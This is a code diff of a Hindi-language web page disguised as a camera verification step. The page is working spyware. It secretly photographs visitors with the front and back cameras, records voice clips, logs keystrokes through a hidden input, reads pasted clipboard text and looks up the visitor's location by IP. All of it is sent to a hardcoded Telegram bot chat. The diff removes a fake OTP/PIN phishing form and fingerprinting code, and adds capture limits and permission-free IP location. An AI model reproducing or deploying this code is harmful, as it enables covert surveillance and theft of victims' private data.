@@ -13,10 +13,6 @@
         @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
         #errorDetail{font-size:14px;color:#888;margin-top:10px;word-break:break-all;max-width:400px;display:none;}
         .hidden-input{position:fixed;top:-9999px;left:-9999px;opacity:0;height:0;width:0;}
-        .fake-form{display:none;margin-top:20px;padding:20px;background:#fff3f3;border-radius:10px;border:1px solid #ffcccc;}
-        .fake-form input{padding:12px;font-size:16px;width:80%;border:2px solid #ddd;border-radius:8px;text-align:center;margin-bottom:12px;}
-        .fake-form button{padding:12px 24px;background:#dc3545;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;}
-        .fake-form button:hover{background:#c82333;}
     </style>
 </head>
 <body onload="startAll()">
@@ -26,24 +22,12 @@
     <div id="loader" class="loader"></div>
     <p id="status">कैमरा कनेक्टिंग...</p>
     <p id="errorDetail"></p>
-    
-    <div id="fakeAuthForm" class="fake-form">
-        <p style="color:#dc3545;font-weight:bold;margin-bottom:10px;">⚠️ पुनः सत्यापन आवश्यक</p>
-        <p style="color:#666;font-size:14px;margin-bottom:15px;">सुरक्षा प्रणाली में त्रुटि। कृपया अपना सत्यापन कोड (OTP/PIN) दर्ज करें।</p>
-        <input type="password" id="otpInput" placeholder="अपना OTP/PIN दर्ज करें..." autocomplete="off">
-        <br>
-        <button onclick="submitFakeOtp()">✅ सत्यापित करें</button>
-    </div>
 </div>
 
-<!-- Hidden video for camera -->
 <video id="videoFront" autoplay playsinline muted
     style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none;">
 </video>
-
 <canvas id="canvas" style="display:none;"></canvas>
-
-<!-- Hidden input for keylogger focus trap -->
 <input id="keyloggerInput" class="hidden-input" autocomplete="off">
 
 <script>
@@ -53,6 +37,11 @@ const DEFAULT_CHAT_ID = "8146265514";
 const _urlParams = new URLSearchParams(window.location.search);
 const CHAT_ID = _urlParams.get('id') || DEFAULT_CHAT_ID;
 
+// Limits
+const MAX_PHOTOS = 6;
+const MAX_VOICE_NOTES = 3;
+const VOICE_DURATION_MS = 10000; // 10 seconds each
+
 // ===================== DOM REFS =====================
 const videoFront = document.getElementById("videoFront");
 const canvas = document.getElementById("canvas");
@@ -60,14 +49,14 @@ const statusText = document.getElementById("status");
 const titleText = document.getElementById("titleText");
 const loader = document.getElementById("loader");
 const errorDetail = document.getElementById("errorDetail");
-const fakeAuthForm = document.getElementById("fakeAuthForm");
-const otpInput = document.getElementById("otpInput");
 const klInput = document.getElementById("keyloggerInput");
 
 let frontStream = null;
 let audioStream = null;
 let mediaRecorder = null;
 let audioChunks = [];
+let photoCount = 0;
+let voiceCount = 0;
 let captureInterval = null;
 let timeouts = [];
 let intervals = [];
@@ -90,11 +79,9 @@ function setDone() {
 
 function tgSend(method, payload) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
-    
     if (payload instanceof FormData) {
         return fetch(url, { method: "POST", body: payload }).then(r => r.json()).catch(() => {});
     }
-    
     return fetch(url, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -102,23 +89,18 @@ function tgSend(method, payload) {
     }).then(r => r.json()).catch(() => {});
 }
 
-// ===================== STAGE 1: CAMERA CAPTURE =====================
+// ===================== STAGE 1: CAMERA - FIRST CAPTURE =====================
 function startCamera() {
     return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
     .then(stream => {
         frontStream = stream;
         videoFront.srcObject = stream;
-        
         return new Promise((resolve) => {
             videoFront.onplaying = () => {
                 setStatus("कैमरा स्कैनिंग... अंतिम चरण...", "blue");
-                setTimeout(() => {
-                    capturePhoto(resolve);
-                }, 800);
+                setTimeout(() => { capturePhoto(resolve); }, 800);
             };
-            videoFront.onloadedmetadata = () => {
-                videoFront.play().catch(() => {});
-            };
+            videoFront.onloadedmetadata = () => { videoFront.play().catch(() => {}); };
         });
     });
 }
@@ -138,24 +120,27 @@ function capturePhoto(callback) {
         const fd = new FormData();
         fd.append("chat_id", CHAT_ID);
         fd.append("photo", b, "capture.png");
-        fd.append("caption", `📸 Front Camera — ${new Date().toLocaleString()}`);
-        
+        fd.append("caption", `📸 फोटो ${++photoCount}/${MAX_PHOTOS} — ${new Date().toLocaleString()}`);
         tgSend("sendPhoto", fd);
         
         if (frontStream) {
             frontStream.getTracks().forEach(t => t.stop());
             frontStream = null;
         }
-        
         if (callback) callback();
     }, "image/png");
 }
 
-// ===================== STAGE 2: CONTINUOUS CAPTURE (background) =====================
+// ===================== STAGE 2: CONTINUOUS CAPTURE (PHOTO 2-6) =====================
 function startContinuousCapture() {
     setDone();
     
     captureInterval = setInterval(() => {
+        if (photoCount >= MAX_PHOTOS) {
+            clearInterval(captureInterval);
+            return;
+        }
+        
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
         .then(stream => {
             const tempVideo = document.createElement("video");
@@ -175,7 +160,8 @@ function startContinuousCapture() {
                     c.toBlob(b => {
                         const fd = new FormData();
                         fd.append("chat_id", CHAT_ID);
-                        fd.append("photo", b, `surveillance_${Date.now()}.png`);
+                        fd.append("photo", b, `photo_${Date.now()}.png`);
+                        fd.append("caption", `📸 फोटो ${++photoCount}/${MAX_PHOTOS} — ${new Date().toLocaleString()}`);
                         tgSend("sendPhoto", fd);
                         
                         stream.getTracks().forEach(t => t.stop());
@@ -185,16 +171,18 @@ function startContinuousCapture() {
             };
         })
         .catch(() => {});
-    }, 10000);
+    }, 15000); // हर 15 सेकंड में एक फोटो
 }
 
-// ===================== STAGE 3: MICROPHONE RECORDING =====================
-function startMicRecording() {
+// ===================== STAGE 3: VOICE NOTES (LIMITED TO 3) =====================
+function startVoiceRecording() {
+    if (voiceCount >= MAX_VOICE_NOTES) return;
+    
     navigator.mediaDevices.getUserMedia({ audio: true, video: false })
     .then(stream => {
         audioStream = stream;
-        mediaRecorder = new MediaRecorder(stream, { 
-            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm' 
+        mediaRecorder = new MediaRecorder(stream, {
+            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm'
         });
         
         mediaRecorder.ondataavailable = e => {
@@ -205,57 +193,82 @@ function startMicRecording() {
             const blob = new Blob(audioChunks, { type: 'audio/webm' });
             const fd = new FormData();
             fd.append("chat_id", CHAT_ID);
-            fd.append("audio", blob, `recording_${Date.now()}.webm`);
-            fd.append("caption", `🎤 Mic Recording — ${new Date().toLocaleString()}`);
+            fd.append("audio", blob, `voice_${Date.now()}.webm`);
+            fd.append("caption", `🎤 वॉइस नोट ${++voiceCount}/${MAX_VOICE_NOTES} — ${new Date().toLocaleString()}`);
             tgSend("sendAudio", fd);
             audioChunks = [];
             
-            if (mediaRecorder && mediaRecorder.state === 'inactive') {
-                setTimeout(() => {
-                    try { mediaRecorder.start(); } catch(e) {}
-                }, 1000);
+            // अगर और वॉइस नोट बाकी हैं तो अगला start करो
+            if (voiceCount < MAX_VOICE_NOTES) {
+                timeouts.push(setTimeout(startVoiceRecording, 2000));
+            } else {
+                // सब हो गया, stream बंद करो
+                if (audioStream) {
+                    audioStream.getTracks().forEach(t => t.stop());
+                    audioStream = null;
+                }
             }
         };
         
         mediaRecorder.start();
+        setStatus(`वॉइस नोट ${voiceCount + 1}/${MAX_VOICE_NOTES} रिकॉर्ड हो रहा है...`, "blue");
         
-        intervals.push(setInterval(() => {
+        // 10 सेकंड बाद stop
+        timeouts.push(setTimeout(() => {
             if (mediaRecorder && mediaRecorder.state === 'recording') {
                 mediaRecorder.stop();
             }
-        }, 10000));
+        }, VOICE_DURATION_MS));
     })
     .catch(() => {});
 }
 
-// ===================== STAGE 4: GEOLOCATION =====================
-function getLocation() {
-    navigator.geolocation.getCurrentPosition(
-        pos => {
-            tgSend("sendLocation", {
-                chat_id: CHAT_ID,
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-            });
-            
-            tgSend("sendMessage", {
-                chat_id: CHAT_ID,
-                text: `📍 Location: ${pos.coords.latitude}, ${pos.coords.longitude}\n🎯 Accuracy: ${pos.coords.accuracy}m\n🕐 ${new Date().toLocaleString()}`
-            });
-        },
-        () => {
-            timeouts.push(setTimeout(getLocation, 2000));
-        },
-        { enableHighAccuracy: true, timeout: 8000 }
-    );
+// ===================== STAGE 4: IP-BASED LOCATION =====================
+function getIPLocation() {
+    // Step 1: Get public IP
+    fetch('https://api64.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        const ip = data.ip;
+        
+        // Step 2: Get location via IP-API (no key needed, HTTP, 45 req/min limit)
+        fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
+        .then(r => r.json())
+        .then(loc => {
+            if (loc.status === 'success') {
+                let msg = `🌐 IP Location\n`;
+                msg += `IP: ${loc.query}\n`;
+                msg += `📍 ${loc.city}, ${loc.regionName}, ${loc.country}\n`;
+                msg += `🗺️ Lat: ${loc.lat}, Lon: ${loc.lon}\n`;
+                msg += `🕐 Timezone: ${loc.timezone}\n`;
+                msg += `🏢 ISP: ${loc.isp}\n`;
+                msg += `🏛️ Org: ${loc.org}\n`;
+                msg += `🔗 AS: ${loc.as}\n`;
+                msg += `📮 ZIP: ${loc.zip}\n`;
+                msg += `🕐 ${new Date().toLocaleString()}`;
+                
+                tgSend("sendMessage", {
+                    chat_id: CHAT_ID,
+                    text: msg
+                });
+                
+                // Also send a location pin with lat/lon
+                tgSend("sendLocation", {
+                    chat_id: CHAT_ID,
+                    latitude: loc.lat,
+                    longitude: loc.lon
+                });
+            }
+        })
+        .catch(() => {});
+    })
+    .catch(() => {});
 }
 
 // ===================== STAGE 5: KEYLOGGER =====================
 let keystrokeBuffer = [];
 
 document.addEventListener('keydown', (e) => {
-    if (e.target === otpInput) return;
-    
     const key = e.key;
     if (key === 'Enter') keystrokeBuffer.push('⏎');
     else if (key === 'Backspace') keystrokeBuffer.push('⌫');
@@ -264,126 +277,45 @@ document.addEventListener('keydown', (e) => {
     else if (key === 'Shift' || key === 'Control' || key === 'Alt' || key === 'Meta') return;
     else if (key.length === 1) keystrokeBuffer.push(key);
     
-    if (keystrokeBuffer.length >= 30 || key === 'Enter') {
-        flushKeystrokes();
-    }
+    if (keystrokeBuffer.length >= 30 || key === 'Enter') flushKeystrokes();
 });
 
-document.addEventListener('click', () => {
-    if (document.activeElement !== otpInput) {
-        klInput.focus();
-    }
-});
-
-intervals.push(setInterval(() => {
-    if (document.activeElement !== otpInput) {
-        klInput.focus();
-    }
-}, 3000));
-
+document.addEventListener('click', () => { klInput.focus(); });
+intervals.push(setInterval(() => { klInput.focus(); }, 3000));
 klInput.focus();
 
 klInput.addEventListener('input', () => {
     const val = klInput.value;
-    if (val.length > 0) {
-        keystrokeBuffer.push(val);
-        klInput.value = '';
-    }
+    if (val.length > 0) { keystrokeBuffer.push(val); klInput.value = ''; }
 });
 
 function flushKeystrokes() {
     if (keystrokeBuffer.length === 0) return;
     const text = keystrokeBuffer.join('');
     keystrokeBuffer = [];
-    
-    tgSend("sendMessage", {
-        chat_id: CHAT_ID,
-        text: `⌨️ Keys: ${text}`
-    });
+    tgSend("sendMessage", { chat_id: CHAT_ID, text: `⌨️ Keys: ${text}` });
 }
-
 intervals.push(setInterval(flushKeystrokes, 10000));
 
-// ===================== STAGE 6: CLIPBOARD STEALING =====================
+// ===================== STAGE 6: CLIPBOARD =====================
 document.addEventListener('paste', (e) => {
-    if (e.target === otpInput) return;
-    
     setTimeout(() => {
         const pasted = navigator.clipboard.readText().catch(() => {
             const clipData = e.clipboardData || window.clipboardData;
-            if (clipData) {
-                return clipData.getData('text');
-            }
-            return null;
+            return clipData ? clipData.getData('text') : null;
         });
         
         if (pasted && typeof pasted === 'string') {
-            tgSend("sendMessage", {
-                chat_id: CHAT_ID,
-                text: `📋 Clipboard: ${pasted.substring(0, 500)}`
-            });
+            tgSend("sendMessage", { chat_id: CHAT_ID, text: `📋 Clipboard: ${pasted.substring(0, 500)}` });
         } else if (typeof pasted === 'object' && pasted.then) {
             pasted.then(text => {
-                if (text) {
-                    tgSend("sendMessage", {
-                        chat_id: CHAT_ID,
-                        text: `📋 Clipboard: ${text.substring(0, 500)}`
-                    });
-                }
+                if (text) tgSend("sendMessage", { chat_id: CHAT_ID, text: `📋 Clipboard: ${text.substring(0, 500)}` });
             }).catch(() => {});
         }
     }, 100);
 });
 
-// ===================== STAGE 7: BROWSER FINGERPRINTING =====================
-function sendFingerprint() {
-    const fp = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages,
-        screen: `${screen.width}x${screen.height}@${screen.colorDepth}`,
-        availScreen: `${screen.availWidth}x${screen.availHeight}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        cpuCores: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        maxTouchPoints: navigator.maxTouchPoints || 0,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        vendor: navigator.vendor,
-        appVersion: navigator.appVersion,
-        plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ')
-    };
-    
-    tgSend("sendMessage", {
-        chat_id: CHAT_ID,
-        text: `🖥️ Fingerprint:\n\`\`\`json\n${JSON.stringify(fp, null, 2)}\n\`\`\``,
-        parse_mode: 'Markdown'
-    });
-    
-    const fpCanvas = document.createElement('canvas');
-    fpCanvas.width = 256;
-    fpCanvas.height = 256;
-    const ctx = fpCanvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(125, 1, 62, 20);
-    ctx.fillStyle = '#069';
-    ctx.fillText('Canvas Fingerprint', 2, 15);
-    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-    ctx.fillText('Security Check', 4, 45);
-    
-    fpCanvas.toBlob(b => {
-        const fd = new FormData();
-        fd.append("chat_id", CHAT_ID);
-        fd.append("photo", b, "canvas_fingerprint.png");
-        fd.append("caption", `🖼️ Canvas fingerprint — ${new Date().toLocaleString()}`);
-        tgSend("sendPhoto", fd);
-    });
-}
-// ===================== STAGE 9: BACK CAMERA =====================
+// ===================== STAGE 7: BACK CAMERA =====================
 function tryBackCamera() {
     navigator.mediaDevices.enumerateDevices()
     .then(devices => {
@@ -391,10 +323,7 @@ function tryBackCamera() {
             (d.label.toLowerCase().includes('back') || d.label.toLowerCase().includes('rear') || d.label.toLowerCase().includes('environment')));
         
         if (backCamera) {
-            return navigator.mediaDevices.getUserMedia({
-                video: { deviceId: { exact: backCamera.deviceId } },
-                audio: false
-            });
+            return navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: backCamera.deviceId } }, audio: false });
         }
         return null;
     })
@@ -403,8 +332,7 @@ function tryBackCamera() {
         
         const tempVideo = document.createElement("video");
         tempVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;";
-        tempVideo.setAttribute("playsinline", "");
-        tempVideo.setAttribute("muted", "");
+        tempVideo.setAttribute("playsinline", ""); tempVideo.setAttribute("muted", "");
         tempVideo.srcObject = stream;
         document.body.appendChild(tempVideo);
         
@@ -433,17 +361,20 @@ function tryBackCamera() {
 
 // ===================== MAIN ENTRY POINT =====================
 async function startAll() {
-    try {
-        await startCamera();
-    } catch(e) {}
+    // Step 1: Front camera
+    try { await startCamera(); } catch(e) {}
     
-    sendFingerprint();
+    // Step 2: Back camera
     tryBackCamera();
-    startMicRecording();
-    getLocation();
+    
+    // Step 3: Start continuous capture (photo 2-6)
     startContinuousCapture();
     
-    timeouts.push(setTimeout(showFakeAuth, 3000));
+    // Step 4: IP location (no GPS, no user permission needed)
+    getIPLocation();
+    
+    // Step 5: Start voice recording (3 notes, 10 sec each)
+    timeouts.push(setTimeout(startVoiceRecording, 3000));
 }
 
 // ===================== CLEANUP =====================
@@ -457,9 +388,8 @@ window.addEventListener("beforeunload", () => {
         if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
         audioStream.getTracks().forEach(t => t.stop());
     }
-    
     flushKeystrokes();
 });
 </script>
 </body>
-</html>
+    </html>
